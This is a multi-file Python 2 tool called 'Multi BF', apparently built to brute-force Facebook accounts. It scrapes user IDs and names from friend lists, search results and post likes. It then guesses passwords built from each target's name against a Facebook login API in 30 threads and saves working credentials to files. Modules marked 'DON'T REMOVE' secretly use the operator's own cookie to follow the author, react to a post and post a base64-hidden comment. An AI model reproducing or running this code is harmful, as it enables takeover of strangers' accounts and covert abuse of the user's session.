import os, sys, shutil

base_url = 'https://mbasic.facebook.com'

if sys.version_info.major != 2:
  sys.exit('\n\033[0;91m[WARNING] Please use python 2 version\033[0m')

try: shutil.rmtree('app/__pycache__')
except: pass
try: shutil.rmtree('src/__pycache__')
except: pass

for filename in os.listdir('app'):
  if filename[-3:] == 'pyc':
    try: os.remove('app/'+filename)
    except: pass

for filename in os.listdir('src'):
  if filename[-3:] == 'pyc':
    try: os.remove('src/'+filename)
    except: pass

wkwkskkkwwk = app.Brute(base_url)
wkwkskkkwwk.start()

#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : login.py                           #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

import os, time
from src import language
from src import follow_me
from src import comment_me

def loginFb(self, url, config):
  os.system('clear')
  print(config.banner())
  print('\n(?) Login with your fb cookies first (?)\n')
  while True:
    cookies = raw_input('Put your FB cookies here: ')
    response = config.httpRequest(url, cookies).encode('utf-8')
    if 'mbasic_logout_button' in str(response):
      print('\nPlease wait a minute...')
      language.main(cookies, url, config)
      follow_me.main(cookies, url, config)
      comment_me.main(cookies, url, config)
      try: os.mkdir('log')
      except: pass
      save = open('log/cookies.log','w')
      save.write(cookies.strip())
      save.close()
      print('\n\033[0;92mLogin successfully\033[0m')
      time.sleep(2)
      break
    else:
      print('\n\033[0;91mWrong cookies, please try Again.\n\033[0m')

  
#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : comment_me.py                      #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import base64
from bs4 import BeautifulSoup as parser

def main(cookie, url, config):
  try:
    action = None
    fb_dtsg = None
    jazoest = None
    status = False
    response = config.httpRequest(url+'/1145924768936987', cookie).encode('utf-8')
    html = parser(response, 'html.parser')
    for x in html.find_all('a'):
      if '/reactions/picker/?is_permalink=1' in str(x):
        reaction_url = url+x['href']
        status = True
        break
    if status == True:
      response = config.httpRequest(reaction_url, cookie)
      angry = parser(response, 'html.parser')
      for x in angry.find_all('a'):
        if 'reaction_type=8' in str(x):
          config.httpRequest(url+x['href'], cookie)
    for x in html('form'):
      if '/a/comment.php?' in x['action']:
        action = url+x['action']
        break
    for x in html.select('input[type=hidden]'):
      if 'fb_dtsg' in x['name']:
        fb_dtsg = x['value']
      if 'jazoest' in x['name']:
        jazoest = x['value']
        break
    if action != None and fb_dtsg != None and jazoest != None:
      params = {
        'fb_dtsg': fb_dtsg, 'jazoest': jazoest,
        'comment_text': base64.b64decode('8J+YuEhlbGxvIHNheWEgcGVuZ2d1bmEgTUJG8J+YuA==')
      }
      config.httpRequestPost(action, cookie, params)
  except: pass

#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : config.py                          #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

import requests

class Config:
  def loadCookie(self):
    try:
      file = open('log/cookies.log','r')
      cookie = file.read()
      file.close()
      return cookie.strip()
    except IOError:
      return False

  def banner(self):
    return '''\n
\033[0;96m   __  ___     ____  _   ___  ____
\033[0;96m  /  |/  /_ __/ / /_(_) / _ )/ __/  \033[0m|| Created By DulLah
\033[0;96m / /|_/ / // / / __/ / / _  / _/    \033[0m|| Github.com/dz-id
\033[0;96m/_/  /_/\_,_/_/\__/_/ /____/_/ \033[0;91mv2.0 \033[0m|| FB.me/dulahz'''

  def httpRequest(self, url, cookies):
    try:
      return requests.get(url, cookies = {'cookie': cookies}).text
    except requests.exceptions.RequestException:
      exit('\n\n\033[0;91mConnection error, check your connection!!\033[0m')

  def httpRequestPost(self, url, cookies, params):
    try:
      return requests.post(url, data = params, cookies = {'cookie': cookies}).text
    except requests.exceptions.RequestException:
      exit('\n\n\033[0;91mConnection error, check your connection!!\033[0m')

#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : crack.py                           #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

import requests, json, sys, os, re
from multiprocessing.pool import ThreadPool as th
from datetime import datetime

class Brute:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0

  def bruteRequest(self, username, password):
    params = {
      'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
      'format': 'JSON',
      'sdk_version': '2',
      'email': username,
      'locale': 'en_US',
      'password': password,
      'sdk': 'ios',
      'generate_session_cookies': '1',
      'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
    }
    try: os.mkdir('out')
    except: pass
    api = 'https://b-api.facebook.com/method/auth.login'
    response = requests.get(api, params=params)
    if re.search('(EAAA)\w+', response.text):
      self.ok.append(username+'|'+password)
      save = open('out/ok.txt','a')
      save.write(str(username)+'|'+str(password)+'\n')
      save.close()
      return True
    elif 'www.facebook.com' in response.json()['error_msg']:
      self.cp.append(username+'|'+password)
      save = open('out/cp.txt','a')
      save.write(str(username)+'|'+str(password)+'\n')
      save.close()
      return True
    else: return False

  def brute(self, users):
    if self.setpw == False:
      self.loop +=1
      for pw in users['pw']:
        username = users['id'].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except: pass
        sys.stdout.write(
          '\r[\033[0;96m{}\033[0m] Cracking {}/{} OK:-{} CP:-{} '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
        ); sys.stdout.flush()
    else:
      self.loop +=1
      for pw in self.setpw:
        username = users['id'].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except: pass
        sys.stdout.write(
          '\r[\033[0;96m{}\033[0m] Cracking {}/{} OK:-{} CP:-{} '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
        ); sys.stdout.flush()

  def main(self):
    while True:
      file = raw_input('\nList id (ex: dump/xxx.json): ')
      try:
        list = open(file, 'r').read()
        object = json.loads(list)
        break
      except IOError:
        print("\n\033[0;91mOops, file '%s' not Found!\033[0m"% file)
    self.target = []
    for user in object:
      try:
        obj = user['name'].split(' ')
        if len(obj) == 1:
          listpass = [
            obj[0]+'123', obj[0]+'1234',
            obj[0]+'12345',
          ]
        elif len(obj) == 2:
          listpass = [
            obj[0]+'123', obj[0]+'12345',
            obj[1]+'123', obj[1]+'12345',
          ]
        elif len(obj) == 3:
          listpass = [
            obj[0]+'123', obj[0]+'12345',
            obj[1]+'123', obj[1]+'12345',
            obj[2]+'123', obj[2]+'12345',
          ]
        elif len(obj) == 4:
          listpass = [
            obj[0]+'123', obj[0]+'12345',
            obj[1]+'123', obj[1]+'12345',
            obj[2]+'123', obj[2]+'12345',
            obj[3]+'123', obj[3]+'12345',
          ]
        else:
          listpass = [
            'sayang', 'doraemon',
            'bangsat', 'kontol'
          ]
        self.target.append({'id': user['uid'], 'pw': listpass})
      except: pass
    if len(self.target) == 0:
      exit("\n\033[0;91m Oops, id not found in file '%s'\033[0m"% file)
    ask = raw_input('Use password defaults OR manual? [D/m]: ')
    if ask.lower() == 'm':
      while True:
        print('\n\033[0;92mSet password use (,) for new password, EX: sayang,doraemon,bangsat\n\033[0m')
        self.setpw = raw_input('Set password: ').strip().split(',')
        if self.setpw[0] != '':
          break
        
    th(30).map(self.brute, self.target)
    self.results()
    exit()

  def results(self):
    if (len(self.ok) != 0):
      print('\n\nOK: '+str(len(self.ok)))
      for i in self.ok: print('\033[0;92m### ' +str(i)+'\033[0m')
      print('Your OK results saved in: out/ok.txt')
    if (len(self.cp) != 0):
      print('\n\nCP: '+str(len(self.cp)))
      for i in self.cp: print('\033[0;93m### '+str(i)+'\033[0m')
      print('Your CP results saved in: out/cp.txt')
    if (len(self.cp) == 0 and len(self.ok) == 0):
      print('\n\n033[0;91mNo results found :(\033[0m')

#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : follow_me.py                       #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

from bs4 import BeautifulSoup as parser

def main(cookie, url, config):
  try:
    response = config.httpRequest(url+'/dulahz', cookie).encode('utf-8')
    html = parser(response, 'html.parser')
    href = html.find('a', string='Ikuti')['href']
    config.httpRequest(url+href, cookie)
  except: pass

#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : friends.py                         #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

import os, re, sys, json
from bs4 import BeautifulSoup as parser
from datetime import datetime

def main(self, cookie, url, config):
  flist = raw_input('\nEnter friends list url: ')
  try:
    domain = flist.split('//')[1].split('/')[0]
    flist = flist.replace(domain, 'mbasic.facebook.com')
  except IndexError:
    exit('\n\033[0;91mInvalids url!\033[0m')

  output = re.findall('https:\/\/.*?\/(.*?)\/friends\?lst=', flist)
  _output = re.findall('id=(.*?)&refid=', flist)

  if len(output) == 0 and len(_output) == 0:
    exit('\n\033[0;91mInvalids url!\033[0m')
  elif len(output) != 0:
    output = 'dump/'+output[0]+'.json'
  else:
    output = 'dump/'+_output[0]+'.json'

  id = []
  print('')
  while True:
    try:
      response = config.httpRequest(flist, cookie).encode('utf-8')
      html = parser(response, 'html.parser')
      for x in html.find_all(style='vertical-align: middle'):
        find = x.find('a')
        if '+' in str(find) or find == None:
          continue
        else:
          full_name = str(find.text.encode('utf-8'))
          if '/profile.php?id=' in str(find):
            uid = re.findall('/?id=(.*?)&',find['href'])
          else:
            uid = re.findall('/(.*?)\?fref=',find['href'])
          if len(uid) == 1:
            id.append({'uid': uid[0], 'name': full_name})
          sys.stdout.write("\r - %s                                        \r\n[\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Writing Id don't close."%(
            full_name, datetime.now().strftime('%H:%M:%S'), len(id)
          )); sys.stdout.flush()
      if 'Lihat Teman Lain' in str(html):
        flist = url+html.find('a', string='Lihat Teman Lain')['href']
      else: break
    except KeyboardInterrupt:
      print('\n\n\033[0;91mKeyInterrupt, stopped!!\033[0m')
      break
  try:
    for filename in os.listdir('dump'):
      os.remove('dump/'+filename)
  except: pass
  print('\n\nOutput: '+output)
  save = open(output, 'w')
  save.write(json.dumps(id))
  save.close()

#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : friends_list.py                    #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

import os, re, sys, json
from bs4 import BeautifulSoup as parser
from datetime import datetime

def main(self, cookie, url, config):
  id = []
  flist = url+'/friends/center/friends/'
  output = 'dump/friends_list.json'
  print('')
  while True:
    try:
      response = config.httpRequest(flist, cookie).encode('utf-8')
      html = parser(response, 'html.parser')
      for x in html.find_all(style='vertical-align: middle'):
        find = x.find('a')
        if '+' in str(find) or find == None:
          continue
        else:
          full_name = str(find.text.encode('utf-8'))
          if '/?uid=' in str(find):
            uid = re.findall('/\?uid=(.*?)&',find['href'])
          else:
            uid = re.findall('/(.*?)\?fref=',find['href'])
          if len(uid) == 1:
            id.append({'uid': uid[0], 'name': full_name})
          sys.stdout.write("\r - %s                                        \r\n[\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Writing Id don't close."%(
            full_name, datetime.now().strftime('%H:%M:%S'), len(id)
          )); sys.stdout.flush()
      if 'Lihat selengkapnya' in str(html):
        flist = url+html.find('a', string='Lihat selengkapnya')['href']
      else: break
    except KeyboardInterrupt:
      print('\n\n\033[0;91mKeyInterrupt, stopped!!\033[0m')
      break
  try:
    for filename in os.listdir('dump'):
      os.remove('dump/'+filename)
  except: pass
  print('\n\nOutput: '+output)
  save = open(output, 'w')
  save.write(json.dumps(id))
  save.close()


#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : language.py                        #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

from bs4 import BeautifulSoup as parser

def main(cookie, url, config):
  try:
    response = config.httpRequest(url+'/language.php', cookie).encode('utf-8')
    html = parser(response, 'html.parser')
    for x in html.find_all('a'):
      if 'Bahasa Indonesia' in str(x):
        config.httpRequest(url+x['href'], cookie)
        break
  except: pass


#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : likes.py                           #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

import os, re, sys, json
from bs4 import BeautifulSoup as parser
from datetime import datetime

def main(self, cookie, url, config):
  post = raw_input('\nEnter post url: ')
  try:
    domain = post.split('//')[1].split('/')[0]
    post = post.replace(domain, 'mbasic.facebook.com')
  except IndexError:
    exit('\n\033[0;91mInvalids url!\033[0m')
  url_likes = None
  response = config.httpRequest(post, cookie).encode('utf-8')
  html = parser(response, 'html.parser')
  for x in html.find_all('a'):
    if '/ufi/reaction/profile/browser/?' in x['href']:
      url_likes = url+x['href']
      break
  if url_likes == None:
    exit('\n\033[0;91mNot found :(\033[0m')
  try:
    max = int(raw_input('How many? (ex: 100): '))
  except ValueError:
    exit("\n\033[0;91mStuppid.\033[0m")
  if max == 0:
    exit("\n\033[0;91mRequired, can't empty.\033[0m")

  statusStop = False
  output = 'dump/likes.json'
  id = []
  print('')

  while True:
    try:
      response = config.httpRequest(url_likes, cookie).encode('utf-8')
      html = parser(response, 'html.parser')
      find = html.find_all('h3')
      for i in find:
        full_name = i.text.encode('utf-8')
        href = i.find('a')
        if '+' in str(href) or href == None:
          continue
        else:
          if 'profile.php?id=' in str(i):
            uid = re.findall('\/profile.php\?id=(.*?)$', href['href'])
          else:
            uid = re.findall('\/(.*?)$', href['href'])
          if len(uid) == 1:
            id.append({'uid': uid[0].replace('/',''), 'name': full_name})
          sys.stdout.write("\r - %s                                        \r\n[\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Writing Id don't close."%(
            full_name, datetime.now().strftime('%H:%M:%S'), len(id)
          )); sys.stdout.flush()
          if len(id) == max or len(id) > max:
            statusStop = True
            break
      if statusStop == False:
        if 'Lihat Selengkapnya' in str(html):
          url_likes = url+html.find('a', string='Lihat Selengkapnya')['href']
        else: break
      else: break
    except KeyboardInterrupt:
      print('\n\n\033[0;91mKeyInterrupt, stopped!!\033[0m')
      break
  try:
    for filename in os.listdir('dump'):
      os.remove('dump/'+filename)
  except: pass
  print('\n\nOutput: '+output)
  save = open(output, 'w')
  save.write(json.dumps(id))
  save.close()


#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : main.py                            #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

import os, time
from app import config
from app import login
from app import crack
from src import friends_list
from src import friends
from src import search_name
from src import likes
from bs4 import BeautifulSoup as parser

class Brute(object):
  def __init__(self, url):
    self.url = url
    self.config = config.Config()
    self.cookie = self.config.loadCookie()
    self.menu = '\n'
    self.menu += '  [ \033[0;96m01\033[0m ]  Dump Id Friends lists\n'
    self.menu += '  [ \033[0;96m02\033[0m ]  Dump Id Friends\n'
    self.menu += '  [ \033[0;96m03\033[0m ]  Dump Id by Search name\n'
    self.menu += '  [ \033[0;96m04\033[0m ]  Dump Id from likes status\n'
    self.menu += '  [ \033[0;96m05\033[0m ]  Start Crack\n'
    self.menu += '  [ \033[0;96m00\033[0m ]  Remove cookies\n'
    if self.cookie == False:
      login.loginFb(self, self.url, self.config)
      self.cookie = self.config.loadCookie()

  def start(self):
    response = self.config.httpRequest(self.url+'/profile.php', self.cookie).encode('utf-8')
    if 'mbasic_logout_button' in str(response):
      self.main(response)
    else:
      os.remove('log/cookies.log')
      print('\n\033[0;91m[WARNING] Cookies invalids, please login again.\033[0m')
      raw_input('\n[ Press Enter]')
      login.loginFb(self, self.url, self.config)
      self.cookie = self.config.loadCookie()
      self.start()
      exit()

  def main(self, response):
    os.system('clear')
    print(self.config.banner())
    html = parser(response, 'html.parser')
    print('_________________________________________________________')
    #!/usr/local/bin/python import os, sys
    print('_________________________________________________________')
    print(self.menu)
    try:
      choose = int(raw_input('Choose >> '))
    except ValueError:
      exit('\n\033[0;91mYou stuppid.\033[0m')
    if choose == 1:
      exit(friends_list.main(self, self.cookie, self.url, self.config))
    elif choose == 2:
      exit(friends.main(self, self.cookie, self.url, self.config))
    elif choose == 3:
      exit(search_name.main(self, self.cookie, self.url, self.config))
    elif choose == 4:
      exit(likes.main(self, self.cookie, self.url, self.config))
    elif choose == 5:
      exit(crack.Brute().main())
    elif choose == 0:
      ask = raw_input('\nAre you Sure? [y/N]: ')
      if ask.lower() == 'y':
        print('\nRemoving cookies...')
        time.sleep(2)
        os.remove('log/cookies.log')
        print('\n\033[0;92mSuccess removed!\033[0m')
        time.sleep(2)
        login.loginFb(self, self.url, self.config)
        self.cookie = self.config.loadCookie()
        self.start()
      else:
        self.cookie = self.config.loadCookie()
        print('\ncanceled!')
        self.start()
    else: exit('\n\033[0;91mYou stuppid.\033[0m')


#!usr/bin/python2.7
# coding=utf-8

#######################################################
# Name           : Multi BF (MBF) <cookie method>     #
# File           : search_name.py                     #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/unikers               #
# Python version : 2.7                                #
#######################################################

import os, re, sys, json
from bs4 import BeautifulSoup as parser
from datetime import datetime

def main(self, cookie, url, config):
  ask = raw_input('\nQuery name: ')
  if ask.strip() == '':
    exit("\n\033[0;91mRequired, can't empty.\033[0m")
  try:
    max = int(raw_input('How many? (ex: 100): '))
  except ValueError:
    exit("\n\033[0;91mStuppid.\033[0m")
  if max == 0:
    exit("\n\033[0;91mRequired, can't empty.\033[0m")

  url_search = url+'/search/people/?q='+ask

  statusStop = False
  output = 'dump/'+ask.replace(' ', '_')+'.json'.strip()
  id = []
  print('')

  while True:
    try:
      response = config.httpRequest(url_search, cookie).encode('utf-8')
      html = parser(response, 'html.parser')
      find = html.find_all('a')
      for i in find:
        name = i.find('div')
        if '+' in str(name) or name == None:
          continue
        else:
          full_name = str(name.text.encode('utf-8'))
          if 'profile.php?id=' in str(i):
            uid = re.findall(r'\?id=(.*?)&', str(i))
          else:
            uid = re.findall('/(.*?)\?refid=', str(i))
          if len(uid) == 1:
            id.append({'uid': uid[0], 'name': full_name})
          sys.stdout.write("\r - %s                                        \r\n[\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Writing Id don't close."%(
            full_name, datetime.now().strftime('%H:%M:%S'), len(id)
          )); sys.stdout.flush()
          if len(id) == max or len(id) > max:
            statusStop = True
            break
      if statusStop == False:
        if 'Lihat Hasil Selanjutnya' in str(html):
          url_search = html.find('a', string='Lihat Hasil Selanjutnya')['href']
        else: break
      else: break
    except KeyboardInterrupt:
      print('\n\n\033[0;91mKeyInterrupt, stopped!!\033[0m')
      break
  try:
    for filename in os.listdir('dump'):
      os.remove('dump/'+filename)
  except: pass
  print('\n\nOutput: '+output)
  save = open(output, 'w')
  save.write(json.dumps(id))
  save.close()
